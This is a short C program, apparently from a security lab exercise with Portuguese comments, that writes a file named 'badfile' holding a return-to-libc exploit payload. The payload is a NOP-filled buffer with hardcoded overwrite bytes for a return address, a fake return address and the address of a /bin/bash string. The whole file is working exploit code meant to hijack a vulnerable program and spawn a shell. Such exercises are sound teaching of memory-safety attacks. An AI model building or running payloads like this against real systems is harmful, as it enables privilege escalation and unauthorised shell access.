#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char buf[40];
    FILE *badfile;

    badfile = fopen("./badfile", "w");

    memset( buf, 0x90, sizeof(buf) );

    //end retorno
    buf[24] = 0x00;
    buf[25] = 0x71;
    buf[26] = 0x16;
    buf[27] = 0x00;
    //fake ret
    buf[28] = 0x00;
    buf[29] = 0xd2;
    buf[30] = 0x15;
    buf[31] = 0x00;
    // var /bin/bash
    buf[32] = 0x00;
    buf[33] = 0xfe;
    buf[34] = 0xff;
    buf[35] = 0xbf;

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
